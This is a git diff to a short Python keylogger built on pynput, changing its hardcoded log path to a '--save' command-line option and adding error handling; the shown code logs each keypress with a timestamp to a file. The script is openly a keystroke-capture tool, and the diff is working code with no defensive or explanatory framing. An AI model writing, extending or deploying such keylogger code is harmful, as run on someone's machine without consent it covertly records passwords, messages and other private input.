@@ -1,8 +1,17 @@
 from pynput.keyboard import Key, Listener
 import logging
+import argparse
+from sys import exit
 
-log_dir = r"C:/users/username/desktop/"
-logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+parser = argparse.ArgumentParser(description='')
+parser.add_argument('--save', dest='save', action='store', help='location to store the captured keystrokes')
+args = parser.parse_args()
+
+try:
+    logging.basicConfig(filename = (args.save), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+except FileNotFoundError:
+    print("Unable to save here...")
+    exit(0)
 
 def on_press(key):
    logging.info(str(key))
